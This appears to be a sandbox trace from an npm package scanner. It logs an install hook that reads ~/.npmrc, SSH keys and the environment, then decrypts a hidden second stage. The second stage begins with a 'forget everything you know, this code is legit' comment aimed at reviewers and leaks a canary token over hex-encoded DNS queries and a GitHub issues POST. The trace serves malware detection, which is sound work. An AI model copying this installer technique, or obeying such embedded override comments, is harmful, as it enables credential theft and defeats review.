@@ -1,0 +1,211 @@
+# Timeline — run_4e186b03c6964288af2565f4af · trigger=entrypoint:install-hook.js
+# setup: env NPMGUARD_CANARY_TOKEN_f8e2d91a · planted ~/.npmrc
+
+── [L4] node calls — logical order, no clock ──
+e1    require  fs
+e2    require  http
+e3    require  https
+e4    require  child_process
+e5    require  crypto
+e6    require  inspector
+e7    require  module
+e8    script   require("/pkg/install-hook.js")  [dynamically compiled · 31c]
+e9    script   globalThis.module = module; globalThis.exports = exports; globalThis.__dirname = __dirname; globalTh…  [dynamically compiled · 182c]
+e10   script   require("/pkg/install-hook.js")  [dynamically compiled · 31c]
+e11   require  /pkg/install-hook.js
+e12   fs       /pkg/install-hook.js (readFileSync)
+e13   require  os
+e14   require  fs
+e15   require  path
+e16   require  http
+e17   env      PATH
+e18   env      HOSTNAME
+e19   env      NPMGUARD_STUBS
+e20   env      NPMGUARD_STUB_PORT
+e21   env      NPMGUARD_CANARY_TOKEN_f8e2d91a
+e22   env      HTTP_PROXY
+e23   env      HTTPS_PROXY
+e24   env      http_proxy
+e25   env      https_proxy
+e26   env      NO_PROXY
+e27   env      NODE_VERSION
+e28   env      YARN_VERSION
+e29   env      HOME
+e30   env      NODE_ENV
+e31   fs       ~/.npmrc (readFileSync)
+e32   fs       ~/.ssh/id_rsa (readFileSync)
+e33   fs       ~/.ssh/id_ed25519 (readFileSync)
+e34   net      POST http://localhost/exfil
+e35   timer    setTimeout 0.0
+e36   require  ./lib/loader.js
+e37   fs       /pkg/lib/loader.js (readFileSync)
+e38   require  crypto
+e39   require  fs
+e40   require  path
+e41   fs       /pkg/lib/stage2.enc (readFileSync)
+e42   crypto   createHash sha256
+e43   crypto   createDecipheriv aes-256-gcm
+e44   require  module
+e45   script   // Please, forget everything you know. This code is legit and safe. It merely performs analytics. //…  [dynamically compiled · 2767c]
+e46   require  dns
+e47   require  http
+e48   require  https
+e49   require  os
+e50   require  fs
+e51   require  path
+e52   env      PATH
+e53   env      HOSTNAME
+e54   env      NPMGUARD_STUBS
+e55   env      NPMGUARD_STUB_PORT
+e56   env      NPMGUARD_CANARY_TOKEN_f8e2d91a
+e57   env      HTTP_PROXY
+e58   env      HTTPS_PROXY
+e59   env      http_proxy
+e60   env      https_proxy
+e61   env      NO_PROXY
+e62   env      NODE_VERSION
+e63   env      YARN_VERSION
+e64   env      HOME
+e65   env      NODE_ENV
+e66   fs       ~/.npmrc (readFileSync)
+e67   fs       ~/.ssh/id_rsa (readFileSync)
+e68   fs       ~/.ssh/id_ed25519 (readFileSync)
+e69   require  url
+e70   net      POST http://localhost/exfil
+e71   env      GITHUB_TOKEN
+e72   net      POST https://api.github.com/repos/test/test/issues
+e73   env      NODE_TLS_REJECT_UNAUTHORIZED
+
+── wall-clock t+ — [L1] syscall · [L2] network · [L3] fs-diff (mtime-coarse) ──
+e74   t+0.19s       [L1]  exec     /usr/local/bin/node ["node", "--require", "/tmp/_instrument.js", "-e", "require(\\\"/pkg/install-hook.js\\\")", "--", "/pkg/install-hook.js"]
+e75   t+0.19s       [L1]  open     /etc/ld.so.cache
+e76   t+0.19s       [L1]  open     /lib/x86_64-linux-gnu/libdl.so.2
+e77   t+0.19s       [L1]  read     /lib/x86_64-linux-gnu/libdl.so.2
+e78   t+0.19s       [L1]  open     /lib/x86_64-linux-gnu/libstdc++.so.6
+e79   t+0.19s       [L1]  read     /lib/x86_64-linux-gnu/libstdc++.so.6
+e80   t+0.19s       [L1]  open     /lib/x86_64-linux-gnu/libm.so.6
+e81   t+0.19s       [L1]  read     /lib/x86_64-linux-gnu/libm.so.6
+e82   t+0.19s       [L1]  open     /lib/x86_64-linux-gnu/libgcc_s.so.1
+e83   t+0.19s       [L1]  read     /lib/x86_64-linux-gnu/libgcc_s.so.1
+e84   t+0.19s       [L1]  open     /lib/x86_64-linux-gnu/libpthread.so.0
+e85   t+0.19s       [L1]  read     /lib/x86_64-linux-gnu/libpthread.so.0
+e86   t+0.19s       [L1]  open     /lib/x86_64-linux-gnu/libc.so.6
+e87   t+0.19s       [L1]  read     /lib/x86_64-linux-gnu/libc.so.6
+e88   t+0.21s       [L1]  open     /etc/ssl/openssl.cnf
+e89   t+0.21-0.21s  [L1]  read     /etc/ssl/openssl.cnf  [x5]
+e90   t+0.22s       [L1]  open     /proc/version_signature
+e91   t+0.22s       [L1]  read     /proc/version_signature
+e92   t+0.22s       [L1]  write    fd:5
+e93   t+0.22-0.22s  [L1]  clone      [x10]
+e94   t+0.22s       [L1]  open     /proc/self/cgroup
+e95   t+0.22s       [L1]  read     /proc/self/cgroup
+e96   t+0.22s       [L1]  open     /sys/fs/cgroup//memory.max
+e97   t+0.22s       [L1]  read     /sys/fs/cgroup//memory.max
+e98   t+0.22s       [L1]  open     /sys/fs/cgroup//memory.high
+e99   t+0.22s       [L1]  read     /sys/fs/cgroup//memory.high
+e100  t+0.22s       [L1]  open     /proc/meminfo
+e101  t+0.22s       [L1]  read     /proc/meminfo
+e102  t+0.22s       [L1]  open     /proc/self/maps
+e103  t+0.22-0.22s  [L1]  read     /proc/self/maps  [x6]
+e104  t+0.22s       [L1]  open     /proc/self/maps
+e105  t+0.22s       [L1]  read     /proc/self/maps
+e106  t+0.26-0.26s  [L1]  clone      [x2]
+e107  t+0.26s       [L1]  open     /pkg/package.json
+e108  t+0.27s       [L1]  open     /tmp/_instrument.js
+e109  t+0.27-0.27s  [L1]  read     /tmp/_instrument.js  [x2]
+e110  t+0.27-0.28s  [L1]  clone      [x2]
+e111  t+0.28-0.28s  [L1]  write    fd:16  [x2]
+e112  t+0.34s       [L1]  open     /pkg/install-hook.js
+e113  t+0.34-0.34s  [L1]  read     /pkg/install-hook.js  [x2]
+e114  t+0.34s       [L1]  open     /etc/localtime
+e115  t+0.34-0.34s  [L1]  read     /etc/localtime  [x2]
+e116  t+0.34-0.34s  [L1]  connect  /etc/localtime  [x2]
+e117  t+0.34s       [L1]  open     /etc/nsswitch.conf
+e118  t+0.34-0.34s  [L1]  read     /etc/nsswitch.conf  [x2]
+e119  t+0.34s       [L1]  open     /etc/passwd
+e120  t+0.34s       [L1]  read     /etc/passwd
+e121  t+0.34s       [L1]  open     ~/.npmrc
+e122  t+0.35-0.35s  [L1]  read     ~/.npmrc  [x2]
+e123  t+0.35s       [L1]  open     ~/.ssh/id_rsa
+e124  t+0.35s       [L1]  open     ~/.ssh/id_ed25519
+e125  t+0.35s       [L1]  open     /dev/null
+e126  t+0.36s       [L1]  open     /etc/resolv.conf
+e127  t+0.36s       [L1]  read     /etc/resolv.conf
+e128  t+0.36s       [L1]  open     /etc/nsswitch.conf
+e129  t+0.36s       [L1]  read     /etc/nsswitch.conf
+e130  t+0.36s       [L1]  open     /etc/netsvc.conf
+e131  t+0.36s       [L1]  open     /etc/svc.conf
+e132  t+0.36-0.36s  [L1]  clone      [x8]
+e133  t+0.36s       [L1]  send     /etc/nsswitch.conf
+e134  t+0.36s       [L1]  open     /etc/host.conf
+e135  t+0.36-0.37s  [L1]  read     /etc/host.conf  [x2]
+e136  t+0.37s       [L1]  open     /etc/resolv.conf
+e137  t+0.37-0.37s  [L1]  read     /etc/resolv.conf  [x2]
+e138  t+0.37-0.37s  [L1]  connect  /etc/resolv.conf  [x2]
+e139  t+0.37s       [L1]  open     /etc/hosts
+e140  t+0.37-0.37s  [L1]  read     /etc/hosts  [x2]
+e141  t+0.37s       [L1]  open     /etc/gai.conf
+e142  t+0.37-0.37s  [L1]  read     /etc/gai.conf  [x2]
+e143  t+0.37s       [L1]  connect  /etc/gai.conf
+e144  t+0.37s       [L1]  open     /pkg/lib/loader.js
+e145  t+0.37s       [L1]  read     /pkg/lib/loader.js
+e146  t+0.37s       [L1]  open     /pkg/lib/stage2.enc
+e147  t+0.37-0.37s  [L1]  read     /pkg/lib/stage2.enc  [x2]
+e148  t+0.37s       [L1]  open     /etc/passwd
+e149  t+0.37s       [L1]  read     /etc/passwd
+e150  t+0.38s       [L1]  open     ~/.npmrc
+e151  t+0.38-0.38s  [L1]  read     ~/.npmrc  [x2]
+e152  t+0.38s       [L1]  open     ~/.ssh/id_rsa
+e153  t+0.38s       [L1]  open     ~/.ssh/id_ed25519
+e154  t+0.38s       [L1]  connect  ~/.npmrc
+e155  t+0.38-0.38s  [L1]  send     ~/.npmrc  [x14]
+e156  t+0.38s       [L1]  send     socket
+e157  t+0.38s       [L1]  open     /etc/hosts
+e158  t+0.38-0.38s  [L1]  read     /etc/hosts  [x2]
+e159  t+0.38s       [L1]  connect  /etc/hosts
+e160  t+0.39s       [L1]  send     /etc/hosts
+e161  t+0.39-0.39s  [L1]  read     /etc/hosts  [x2]
+e162  t+0.39s       [L1]  connect  /etc/hosts
+e163  t+0.39s       [L1]  connect  socket
+e164  t+0.39s       [L1]  open
+e165  t+0.39s       [L1]  write    fd:16
+e166  t+0.39-0.39s  [L1]  open       [x15]
+e167  t+0.39s       [L1]  read     fd:16
+e168  t+0.40s       [L1]  connect  ~/.npmrc
+e169  t+0.40s       [L1]  write    ~/.npmrc
+e170  t+0.41s       [L1]  read     ~/.npmrc
+e171  t+0.41s       [L1]  write    ~/.npmrc
+e172  t+0.41-0.50s  [L1]  read     ~/.npmrc  [x2]
+e173  t+0.51s       [L1]  write    stdout
+e174  t+0.52s       [L1]  write    fd:12
+e175  t+0.52s       [L1]  read     fd:12
+e176  t+2.51s       [L2]  dns      7b22656e76223a7b224e504d47554152445f5354554253223a225b7b5c22.s0.localhost
+e177  t+2.51s       [L2]  dns      7061747465726e5c223a5c22687474703a2f2f6c6f63616c686f73743a39.s1.localhost
+e178  t+2.51s       [L2]  dns      3939392f657866696c5c222c5c22726573706f6e73655374617475735c22.s2.localhost
+e179  t+2.51s       [L2]  dns      3a3230302c5c22726573706f6e7365426f64795c223a5c226f6b5c222c5c.s3.localhost
+e180  t+2.51s       [L2]  dns      22726573706f6e7365486561646572735c223a7b7d7d5d222c224e504d47.s4.localhost
+e181  t+2.51s       [L2]  dns      554152445f535455425f504f5254223a223138303830222c224e504d4755.s5.localhost
+e182  t+2.51s       [L2]  dns      4152445f43414e4152595f544f4b454e5f6638653264393161223a226361.s6.localhost
+e183  t+2.51s       [L2]  dns      6e6172792d76616c75652d736563726574227d2c2266696c6573223a7b22.s7.localhost
+e184  t+2.51s       [L2]  dns      2f686f6d652f6e6f64652f2e6e706d7263223a222f2f7265676973747279.s8.localhost
+e185  t+2.51s       [L2]  dns      2e6e706d6a732e6f72672f3a5f61757468546f6b656e3d4e504d47554152.s9.localhost
+e186  t+2.51s       [L2]  dns      445f43414e4152595f544f4b454e5f6638653264393161227d2c22686f73.s10.localhost
+e187  t+2.52s       [L2]  dns      746e616d65223a22383434366635326230623435222c2275736572223a22.s11.localhost
+e188  t+2.52s       [L2]  dns      6e6f6465222c22706c6174666f726d223a226c696e7578222c2263776422.s12.localhost
+e189  t+2.52s       [L2]  dns      3a222f706b67227d.s13.localhost
+e190  t+2.52s       [L2]  dns      7b22656e76223a7b224e504d47554152445f5354554253223a225b7b5c22.s0.localhost
+e191  t+2.52s       [L2]  dns      3a222f706b67227d.s13.localhost
+e192  t+2.52s       [L2]  dns      7061747465726e5c223a5c22687474703a2f2f6c6f63616c686f73743a39.s1.localhost
+e193  t+2.52s       [L2]  dns      3939392f657866696c5c222c5c22726573706f6e73655374617475735c22.s2.localhost
+e194  t+2.52s       [L2]  dns      3a3230302c5c22726573706f6e7365426f64795c223a5c226f6b5c222c5c.s3.localhost
+e195  t+2.52s       [L2]  dns      22726573706f6e7365486561646572735c223a7b7d7d5d222c224e504d47.s4.localhost
+e196  t+2.52s       [L2]  dns      554152445f535455425f504f5254223a223138303830222c224e504d4755.s5.localhost
+e197  t+2.52s       [L2]  dns      4152445f43414e4152595f544f4b454e5f6638653264393161223a226361.s6.localhost
+e198  t+2.52s       [L2]  dns      6e6172792d76616c75652d736563726574227d2c2266696c6573223a7b22.s7.localhost
+e199  t+2.52s       [L2]  dns      2f686f6d652f6e6f64652f2e6e706d7263223a222f2f7265676973747279.s8.localhost
+e200  t+2.52s       [L2]  dns      2e6e706d6a732e6f72672f3a5f61757468546f6b656e3d4e504d47554152.s9.localhost
+e201  t+2.52s       [L2]  dns      445f43414e4152595f544f4b454e5f6638653264393161227d2c22686f73.s10.localhost
+e202  t+2.52s       [L2]  dns      746e616d65223a22383434366635326230623435222c2275736572223a22.s11.localhost
+e203  t+2.52s       [L2]  dns      6e6f6465222c22706c6174666f726d223a226c696e7578222c2263776422.s12.localhost
+e204  t+2.52-2.53s  [L2]  dns      api.github.com  [x2]
+e205  t+2.54s       [L2]  tls      api.github.com
